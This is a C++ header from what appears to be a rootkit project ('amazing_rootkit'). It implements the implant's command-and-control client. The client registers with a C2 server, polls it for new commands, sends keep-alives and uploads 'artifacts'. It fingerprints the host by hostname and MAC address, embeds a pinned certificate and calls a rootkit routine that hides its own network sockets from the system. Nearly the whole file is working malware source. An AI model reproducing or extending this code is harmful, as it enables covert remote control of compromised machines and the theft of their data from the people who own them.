#pragma once

#include <iostream>
#include <string>
#include <mutex>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <openssl/ssl.h>

#include "../include/curl/curl.h"
#include "../include/json.hpp"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"
#include "../amazing_rootkit/api/api.h"

using json = nlohmann::json;

#define TARGET_DNS_ENTRY "127.0.0.1 amazing.rootkit"
#define C2_HOST "https://127.0.0.1:1234" //"https://amazing.rootkit:1234"
#define REGISTER_URI C2_HOST"/c2/register/"
#define CHECK_NEW_CMD_URI C2_HOST"/c2/new_command/"
#define KEEP_ALIVE_URI C2_HOST"/c2/keep_alive/"
#define SEND_ARTIFACT C2_HOST"/c2/send_artifact/"

const unsigned char pinned_cert[] = {
    0x30, 0x82, 0x05, 0x9f, 0x30, 0x82, 0x03, 0x87, 0xa0, 0x03, 0x02, 0x01, 
    0x02, 0x02, 0x14, 0x79, 0x44, 0x35, 0x0e, 0x13, 0x2a, 0x64, 0x18, 0x18, 
    0xac, 0x75, 0xf8, 0xf1, 0xe1, 0x13, 0x1b, 0x1e, 0x1d, 0x38, 0xca, 0x30, 
    0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 
    0x05, 0x00, 0x30, 0x5f, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 
    0x06, 0x13, 0x02, 0x41, 0x55, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 
    0x04, 0x08, 0x0c, 0x0a, 0x53, 0x6f, 0x6d, 0x65, 0x2d, 0x53, 0x74, 0x61, 
    0x74, 0x65, 0x31, 0x21, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x0c, 
    0x18, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x65, 0x74, 0x20, 0x57, 0x69, 
    0x64, 0x67, 0x69, 0x74, 0x73, 0x20, 0x50, 0x74, 0x79, 0x20, 0x4c, 0x74, 
    0x64, 0x31, 0x18, 0x30, 0x16, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x0f, 
    0x61, 0x6d, 0x61, 0x7a, 0x69, 0x6e, 0x67, 0x2e, 0x72, 0x6f, 0x6f, 0x74, 
    0x6b, 0x69, 0x74, 0x30, 0x1e, 0x17, 0x0d, 0x32, 0x34, 0x30, 0x38, 0x32, 
    0x33, 0x31, 0x32, 0x33, 0x30, 0x30, 0x31, 0x5a, 0x17, 0x0d, 0x32, 0x35, 
    0x30, 0x38, 0x32, 0x33, 0x31, 0x32, 0x33, 0x30, 0x30, 0x31, 0x5a, 0x30, 
    0x5f, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 
    0x41, 0x55, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x0c, 
    0x0a, 0x53, 0x6f, 0x6d, 0x65, 0x2d, 0x53, 0x74, 0x61, 0x74, 0x65, 0x31, 
    0x21, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x0c, 0x18, 0x49, 0x6e, 
    0x74, 0x65, 0x72, 0x6e, 0x65, 0x74, 0x20, 0x57, 0x69, 0x64, 0x67, 0x69, 
    0x74, 0x73, 0x20, 0x50, 0x74, 0x79, 0x20, 0x4c, 0x74, 0x64, 0x31, 0x18, 
    0x30, 0x16, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x0f, 0x61, 0x6d, 0x61, 
    0x7a, 0x69, 0x6e, 0x67, 0x2e, 0x72, 0x6f, 0x6f, 0x74, 0x6b, 0x69, 0x74, 
    0x30, 0x82, 0x02, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 
    0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x02, 0x0f, 0x00, 
    0x30, 0x82, 0x02, 0x0a, 0x02, 0x82, 0x02, 0x01, 0x00, 0xbc, 0xec, 0xf8, 
    0x62, 0x87, 0x46, 0x00, 0x68, 0xa5, 0x2b, 0x05, 0x73, 0x01, 0x6f, 0xd7, 
    0xb3, 0x3f, 0x16, 0x7e, 0x96, 0xfa, 0x34, 0xa1, 0x8c, 0xe8, 0xbe, 0x45, 
    0xad, 0xe2, 0x31, 0x8a, 0xbb, 0xea, 0xe0, 0xff, 0x52, 0x3d, 0xef, 0x86, 
    0xfe, 0x89, 0xb9, 0x0c, 0x45, 0xd1, 0x2c, 0x29, 0xc7, 0x53, 0x27, 0xeb, 
    0x1b, 0x4b, 0x84, 0xe7, 0x77, 0xed, 0xe4, 0xdb, 0x37, 0x56, 0x24, 0x73, 
    0x1b, 0x74, 0x39, 0x4c, 0xf5, 0x3e, 0xd1, 0xad, 0xb4, 0x1f, 0x21, 0x33, 
    0xc8, 0x9e, 0x9b, 0x3f, 0x26, 0x46, 0xed, 0x8e, 0x0f, 0x65, 0x9d, 0xdc, 
    0xfe, 0x69, 0xb8, 0x6e, 0xaf, 0x45, 0x0c, 0x0a, 0x2d, 0x74, 0x83, 0x65, 
    0xc1, 0x79, 0xc2, 0x28, 0xd1, 0x21, 0x2e, 0x5d, 0x1a, 0x83, 0xa9, 0x72, 
    0x03, 0x19, 0x45, 0x4c, 0xb4, 0x19, 0x8a, 0xaa, 0x49, 0xdd, 0x44, 0xe1, 
    0x90, 0x7b, 0xbc, 0x7b, 0xa4, 0x8f, 0x0e, 0x99, 0x25, 0x39, 0x2a, 0xd1, 
    0xc0, 0x19, 0x44, 0x05, 0x71, 0xec, 0xe7, 0x25, 0xdf, 0xeb, 0x62, 0x4e, 
    0x16, 0x54, 0x53, 0x81, 0xfd, 0x0d, 0xfe, 0xde, 0x4c, 0xc6, 0xf9, 0x2d, 
    0xb4, 0x17, 0xce, 0x04, 0x60, 0x05, 0xb1, 0xff, 0x95, 0x48, 0x2b, 0x45, 
    0xa1, 0x4f, 0x3f, 0xf1, 0xa2, 0x65, 0x65, 0x07, 0x83, 0x83, 0x07, 0x05, 
    0xd2, 0xf3, 0x5c, 0x5b, 0xe6, 0x87, 0xf8, 0xb0, 0x99, 0x55, 0xae, 0x98, 
    0x41, 0xd5, 0x1f, 0x93, 0xea, 0x10, 0x8b, 0x2c, 0xa8, 0xae, 0xdb, 0xae, 
    0x36, 0xcc, 0xd9, 0x9f, 0xf8, 0xdf, 0x8d, 0x83, 0x5c, 0xb2, 0x37, 0x06, 
    0x15, 0x6f, 0x05, 0x46, 0x38, 0xfa, 0xd7, 0x8b, 0xe6, 0x2d, 0x2f, 0xb9, 
    0x53, 0xe7, 0x34, 0x5f, 0xde, 0x22, 0x61, 0x59, 0xd4, 0x51, 0x6b, 0x42, 
    0x71, 0x6e, 0xb7, 0x50, 0x70, 0x99, 0xa8, 0xc2, 0xb7, 0x04, 0x7a, 0xc9, 
    0x42, 0x0e, 0xdd, 0x5a, 0x7e, 0x1d, 0x64, 0x59, 0xa2, 0x7c, 0xf0, 0xc9, 
    0x4f, 0xe1, 0x5d, 0x84, 0xe9, 0x05, 0xce, 0xcd, 0xfc, 0x08, 0x1b, 0x10, 
    0xdc, 0xe2, 0xdb, 0x65, 0x88, 0xc8, 0xd9, 0xb7, 0xc0, 0x0a, 0x10, 0xb2, 
    0x0d, 0x7d, 0x81, 0xb1, 0x96, 0x73, 0x55, 0x8a, 0x9c, 0x2e, 0x73, 0x3c, 
    0xe4, 0x23, 0x01, 0x01, 0x1e, 0x7f, 0xa1, 0x5a, 0x2e, 0x83, 0x46, 0xbd, 
    0x79, 0xeb, 0x4a, 0x0d, 0x26, 0x62, 0xfa, 0x1d, 0x80, 0x2d, 0xf3, 0x9c, 
    0x48, 0xe4, 0xd7, 0x99, 0x2d, 0xfe, 0xe2, 0xd5, 0x7f, 0x8c, 0x91, 0x35, 
    0x5a, 0x79, 0xde, 0xb8, 0x88, 0xe2, 0xfe, 0xab, 0x2d, 0x5f, 0xcd, 0x04, 
    0x7a, 0x7b, 0xc1, 0x3a, 0x95, 0x54, 0xe8, 0x35, 0x96, 0xd5, 0xc8, 0x31, 
    0x93, 0xb8, 0xe3, 0xd4, 0x0a, 0xbc, 0x1c, 0x39, 0xf2, 0x9f, 0x03, 0x7b, 
    0x62, 0x0c, 0xb3, 0x69, 0x69, 0x25, 0xd5, 0xab, 0x5e, 0x75, 0x04, 0x35, 
    0x3a, 0xdb, 0xd2, 0x8b, 0x90, 0xd6, 0xfa, 0xe5, 0xe4, 0x26, 0x04, 0xb9, 
    0xc3, 0xd8, 0xf0, 0xf4, 0x87, 0x64, 0x5c, 0x78, 0xd0, 0x69, 0x3b, 0xe0, 
    0x8f, 0x4b, 0x12, 0xde, 0x65, 0xc0, 0x94, 0xa0, 0xe1, 0xcf, 0x2f, 0x05, 
    0x09, 0x91, 0xc0, 0x77, 0xb0, 0xd4, 0xa0, 0xb8, 0x8e, 0x31, 0x4e, 0xae, 
    0xeb, 0xac, 0x40, 0x11, 0x85, 0x25, 0xe1, 0x23, 0xce, 0xf0, 0xf0, 0x37, 
    0x31, 0xba, 0xbf, 0xf4, 0xa5, 0xa8, 0xd9, 0x3d, 0xbb, 0x1f, 0x0b, 0xee, 
    0xb2, 0x7b, 0x64, 0x4e, 0x11, 0xdf, 0x72, 0xd1, 0xc1, 0x43, 0xaa, 0x02, 
    0xa1, 0xe0, 0xa7, 0x2c, 0x97, 0x10, 0x3f, 0x73, 0x11, 0xb5, 0x06, 0x71, 
    0xaf, 0xa6, 0x29, 0x28, 0x17, 0x4f, 0x6d, 0x7d, 0x4c, 0x0f, 0x06, 0xe4, 
    0x5b, 0x27, 0x96, 0xce, 0xdf, 0x82, 0x57, 0x43, 0x6e, 0x11, 0xf1, 0x95, 
    0x0a, 0x35, 0x67, 0xac, 0x69, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x53, 
    0x30, 0x51, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 
    0x14, 0x45, 0xe8, 0x00, 0xc6, 0x4d, 0x0a, 0x4d, 0x2c, 0x0c, 0x7f, 0x13, 
    0x13, 0x37, 0x30, 0x48, 0xd0, 0x26, 0x26, 0x09, 0x7b, 0x30, 0x1f, 0x06, 
    0x03, 0x55, 0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x45, 0xe8, 
    0x00, 0xc6, 0x4d, 0x0a, 0x4d, 0x2c, 0x0c, 0x7f, 0x13, 0x13, 0x37, 0x30, 
    0x48, 0xd0, 0x26, 0x26, 0x09, 0x7b, 0x30, 0x0f, 0x06, 0x03, 0x55, 0x1d, 
    0x13, 0x01, 0x01, 0xff, 0x04, 0x05, 0x30, 0x03, 0x01, 0x01, 0xff, 0x30, 
    0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 
    0x05, 0x00, 0x03, 0x82, 0x02, 0x01, 0x00, 0xb7, 0x4a, 0x50, 0xa9, 0x1f, 
    0x11, 0x4e, 0xda, 0xb4, 0x18, 0x38, 0x40, 0x79, 0x99, 0x33, 0x0c, 0xec, 
    0xbd, 0x5b, 0x84, 0x75, 0xf7, 0xe2, 0x97, 0xae, 0x9f, 0xf0, 0xf7, 0xc1, 
    0x4a, 0xa4, 0x83, 0x8b, 0xf0, 0xa5, 0x8c, 0xb5, 0xd1, 0x3b, 0xa8, 0x60, 
    0x33, 0xe0, 0x98, 0x47, 0x47, 0x8c, 0x0a, 0xa5, 0xa7, 0x6d, 0xa7, 0x19, 
    0x95, 0xad, 0xcc, 0x2e, 0xa1, 0x5a, 0x84, 0xa8, 0x75, 0x43, 0xc8, 0x22, 
    0xa7, 0xb5, 0x43, 0xe8, 0x16, 0x68, 0x82, 0xb1, 0xb3, 0x22, 0x81, 0x0f, 
    0x0d, 0x93, 0x8d, 0xf8, 0x8e, 0x49, 0xe5, 0xe8, 0x49, 0x15, 0x8a, 0x7c, 
    0xce, 0x2b, 0x83, 0x39, 0xf0, 0xd8, 0xd8, 0x5f, 0xfb, 0x4f, 0xaa, 0x26, 
    0xed, 0x93, 0x5f, 0xd0, 0x02, 0x96, 0x62, 0x46, 0x28, 0x24, 0x22, 0x52, 
    0x38, 0x25, 0x99, 0xec, 0xb7, 0x09, 0xf3, 0x5d, 0xed, 0xf2, 0x3d, 0xce, 
    0x37, 0x04, 0xc1, 0x3f, 0xe8, 0x19, 0xaa, 0x2c, 0x0e, 0x96, 0xe6, 0x11, 
    0x3d, 0x9f, 0xef, 0x57, 0x33, 0xfb, 0xdf, 0x37, 0x41, 0xb0, 0x0d, 0x7c, 
    0xc3, 0x94, 0x7e, 0xee, 0x18, 0xa7, 0x7c, 0x1e, 0x86, 0xd0, 0xb7, 0xa4, 
    0x84, 0xc2, 0x4c, 0x45, 0xa5, 0x43, 0x61, 0x3a, 0x56, 0x1f, 0xe2, 0xd5, 
    0x86, 0x3e, 0x6c, 0xb4, 0xd9, 0xe7, 0xaa, 0x96, 0x62, 0x4b, 0x26, 0x98, 
    0x4f, 0xe2, 0xbc, 0xd7, 0x92, 0x67, 0xf1, 0x74, 0x0f, 0x30, 0xd1, 0x36, 
    0xdf, 0xbf, 0x4b, 0x6e, 0xd2, 0xfa, 0xde, 0xe1, 0xa6, 0x5f, 0x93, 0x7c, 
    0x9f, 0x45, 0x89, 0xd9, 0x15, 0x32, 0x98, 0x15, 0x4b, 0xf0, 0x79, 0xd8, 
    0x1c, 0x6a, 0x7e, 0xb5, 0x16, 0x46, 0xf9, 0xb1, 0xa5, 0x3d, 0x5b, 0xb4, 
    0xdb, 0x40, 0x0a, 0x36, 0x25, 0xc6, 0x7f, 0x24, 0x36, 0x66, 0x56, 0x8f, 
    0xde, 0x08, 0x9f, 0xd5, 0x64, 0x32, 0xb5, 0xd0, 0x10, 0xcd, 0x6d, 0xbb, 
    0xc1, 0xd0, 0x36, 0x64, 0xf4, 0x31, 0x24, 0x5a, 0xa9, 0xc0, 0xb3, 0x61, 
    0x12, 0x3d, 0x46, 0xa1, 0x2a, 0x0a, 0xa5, 0xbc, 0x3b, 0x60, 0xef, 0x9a, 
    0xe8, 0x1b, 0xe4, 0x99, 0x71, 0x0d, 0x80, 0x59, 0xc4, 0xbb, 0xab, 0x71, 
    0xd0, 0x24, 0x73, 0x7f, 0x00, 0xac, 0x33, 0x7c, 0x50, 0xf6, 0x42, 0x91, 
    0xf5, 0x5c, 0x5a, 0xeb, 0xeb, 0x44, 0xad, 0x51, 0x00, 0x75, 0x5b, 0xa1, 
    0x85, 0xc6, 0x9a, 0x53, 0xc7, 0x2c, 0x0a, 0x8d, 0x04, 0xd9, 0xa0, 0xb0, 
    0xfd, 0x9a, 0x55, 0x4f, 0x3b, 0xd4, 0x1c, 0xbd, 0x09, 0x1e, 0x7f, 0x02, 
    0x34, 0x20, 0x36, 0x96, 0x78, 0x60, 0xea, 0x14, 0x71, 0xf2, 0x7d, 0x8e, 
    0xc5, 0xd5, 0x78, 0xcd, 0x40, 0x09, 0xeb, 0x0b, 0xdb, 0x5e, 0x3d, 0xaa, 
    0x2c, 0x82, 0x49, 0xed, 0x58, 0x4f, 0xc5, 0x12, 0xfa, 0x6e, 0x0c, 0x15, 
    0xff, 0xb4, 0x30, 0x07, 0xf4, 0x56, 0x8e, 0xa2, 0xd7, 0x49, 0x5b, 0xc9, 
    0xd7, 0x9d, 0xa1, 0xe1, 0x05, 0x0f, 0x03, 0x7c, 0xc7, 0xae, 0xdd, 0x62, 
    0xef, 0xee, 0x30, 0x80, 0x3b, 0x1f, 0x2a, 0x1e, 0x94, 0xeb, 0xd1, 0x13, 
    0x65, 0xc0, 0x6c, 0x2f, 0x9b, 0x3c, 0x62, 0xe7, 0x73, 0x68, 0xb7, 0x0c, 
    0x8c, 0x9b, 0x62, 0x71, 0xf8, 0x44, 0x17, 0xbc, 0xe6, 0x3b, 0x62, 0xec, 
    0x2a, 0x37, 0xc6, 0xfc, 0xf1, 0xe1, 0xdf, 0xaf, 0xf9, 0x84, 0xcd, 0x0a, 
    0xbb, 0x7e, 0xcf, 0x70, 0x9e, 0x08, 0xa4, 0xdc, 0x37, 0xfa, 0x80, 0x1a, 
    0xe0, 0x62, 0x5b, 0xab, 0x44, 0xad, 0xd6, 0x2b, 0xb4, 0xc5, 0x8f, 0xdc, 
    0x45, 0x59, 0xcb, 0xb6, 0x91, 0xb1, 0x9c, 0x31, 0x1c, 0x6b, 0x28, 0x93, 
    0x4e, 0x98, 0x43, 0xc1, 0xd2, 0x32, 0xb1, 0x59, 0xf1, 0x5e, 0x34, 0x99, 
    0x00, 0x63, 0x2f, 0xbe, 0x8b, 0xec, 0x19, 0x73, 0xd3, 0x03, 0xae, 0x30, 
    0x49, 0x26, 0xc5, 
};

const size_t pinned_cert_size = sizeof(pinned_cert);

class Communicator
{
private:
    std::string client_id;
    CURL * curl;
    std::mutex curl_mtx;

    // static int ssl_verify_callback(int preverify_ok, X509_STORE_CTX *ctx) 
    // {
    //     // // Retrieve the server's certificate from the context
    //     // X509 *server_cert = X509_STORE_CTX_get_current_cert(ctx);

    //     // // Convert the pinned certificate into an X509 structure
    //     // const unsigned char *p = pinned_cert;
    //     // X509 *pinned_cert_obj = d2i_X509(NULL, &p, pinned_cert_size);

    //     // if (!pinned_cert_obj) {
    //     //     return 0; // Fail the verification if the pinned certificate is invalid
    //     // }   

    //     // // Compare the server's certificate with the pinned certificate
    //     // int result = X509_cmp(server_cert, pinned_cert_obj);

    //     // // Clean up
    //     // X509_free(pinned_cert_obj);

    //     // return result == 0;
    // }

    // static CURLcode ssl_ctx_callback(CURL *curl, void *sslctx, void *parm) {
    //     SSL_CTX *ctx = (SSL_CTX *)sslctx;

    //     // Set the custom verification callback
    //     SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, ssl_verify_callback);

    //     return CURLE_OK;
    // }

    static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }
    
    static curl_socket_t opensocket_callback(void *clientp, curlsocktype purpose, struct curl_sockaddr *address)
    {
        curl_socket_t sockfd = socket(address->family, address->socktype, address->protocol);
        if (sockfd == CURL_SOCKET_BAD) {
            printf("Can't create socket: %d\n", sockfd);
        }
        
        struct sockaddr_in * addr_in = (struct sockaddr_in*) &address->addr;
        
        hide_listening_socket(ntohs(addr_in->sin_port));

        return sockfd;
    }   
    
    bool send_request_safe(std::string uri, json * payload, json * response_ptr, bool post=true)
    {
        std::lock_guard<std::mutex> lock(curl_mtx);

        std::cout << "Sending request to " << uri << std::endl; 

        std::string response_buf;
        long resp_code;
        curl = curl_easy_init();
        struct curl_slist *headers = NULL;
        CURLcode res;

        /* Each message should have a client identifier */
        if(!payload->contains("client_id") && !client_id.empty())
        {
            (*payload)["client_id"] = client_id.c_str(); 
        }

        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_buf);
        curl_easy_setopt(curl, CURLOPT_OPENSOCKETFUNCTION, opensocket_callback);
        curl_easy_setopt(curl, CURLOPT_URL, uri.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        //curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, ssl_ctx_callback);

        if (post)
        {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            if(!payload->empty())
            {
                std::string payload_string = payload->dump();
                const char * payload_cstr = payload_string.c_str();
                std::cout << "POST payload: " << payload_cstr << std::endl;
                curl_easy_setopt(curl, CURLOPT_COPYPOSTFIELDS, payload_cstr);
                //curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload_cstr));
            }
        }

        res = curl_easy_perform(curl);
    
        if (res != CURLE_OK) 
        {
            std::cerr << "curl_easy_perform() failed " << curl_easy_strerror(res);
        }  
        else if (!curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &resp_code) && resp_code == 200)
        {
            char * content_type;
            res = curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &content_type);
            if ((res == CURLE_OK) && content_type && std::string(content_type).find("application/json") != std::string::npos && response_ptr)  
            {
                /* If the server sent us some json - Such as a new command */    
                *response_ptr = json::parse(response_buf);
                std::cout << "json response from server: " << response_ptr->dump(4) << std::endl; 
            }
            else
            {
                std::cout << "response buffer: " << response_buf << std::endl;
            }
        }
        else
        {
            std::cerr << "Unsuccessfull HTTP Response Code " << resp_code << std::endl;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        return resp_code == 200;
    }
    
    bool keep_alive()
    {
        return send_request_safe(KEEP_ALIVE_URI, NULL, NULL);
    }

    Communicator() {
        init();
    }

    void generate_agent_id()
    {
	    std::string hostname = MachineUtils::get_host_name();
        std::string macaddr = MachineUtils::get_mac_address();
        std::stringstream ss(hostname);
        ss << "-" << macaddr;
        client_id = CryptoUtils::md5(ss.str());
    }

    void init()
    {
        generate_agent_id();
        if(curl_global_init(CURL_GLOBAL_DEFAULT) != CURLE_OK)
        {
            throw std::runtime_error("Can't init libcurl. Aborting !");
        }
        // if(!MachineUtils::add_etc_hosts_entry(TARGET_DNS_ENTRY))
        // {
        //     throw std::runtime_error("Can't add host entry. Aborting !");
        // }
    }

public:
    
    static Communicator& getInstance() {
        static Communicator instance;
        return instance;
    }
    
    Communicator(const Communicator&) = delete;
    Communicator& operator=(const Communicator&) = delete;

    ~Communicator() {
        curl_global_cleanup();
    }

    bool check_new_command(json * cmd)
    {
        /* 
        We send on payload to the server in this case. 
        We only expect a response payload from the server. 
        */

        json cmd_current;
        json payload;
        payload["client_id"] = client_id;

        bool res = send_request_safe(CHECK_NEW_CMD_URI, &payload, &cmd_current);
        if (res)
        {
            if(cmd_current.contains("status") && cmd_current["status"] == "error")
            {
                std::cout << "Failed fetching new command: " << cmd_current["message"] << std::endl;
                return false;
            }

            *cmd = cmd_current;
            
            return true;
        }
        
        std::cout << "Failed fetching new command due to server error" << std::endl;
        return false;
    }

    bool c2_registration()
    {
        json response;
        json registration_payload;

        return send_request_safe(REGISTER_URI, &registration_payload, &response) && response.contains("status") && response["status"] == "0";
    }

    void send_artifact(json * payload)
    {
        json response;
        send_request_safe(SEND_ARTIFACT, payload, &response);
    }
};